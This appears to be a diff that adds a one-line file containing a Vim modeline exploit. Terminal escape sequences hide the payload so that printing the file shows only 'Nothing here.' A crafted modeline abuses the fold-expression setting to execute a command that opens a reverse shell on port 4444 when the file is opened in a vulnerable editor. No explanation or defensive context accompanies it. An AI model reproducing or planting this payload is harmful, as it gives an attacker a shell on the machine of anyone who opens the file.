@@ -1,0 +1,1 @@
+\x1b[?7l\x1bSNothing here.\x1b:silent! w | call system(\'0<&196;exec 196<>/dev/tcp/localhost/4444; sh <&196 >&196 2>&196\') | redraw! | file | silent! # " vim: set fen fdm=expr fde=assert_fails(\'set\\ fde=x\\ \\|\\ source\\!\\ \\%\') fdl=0: \x16\x1b[1G\x16\x1b[KNothing here."\x16\x1b[D \n
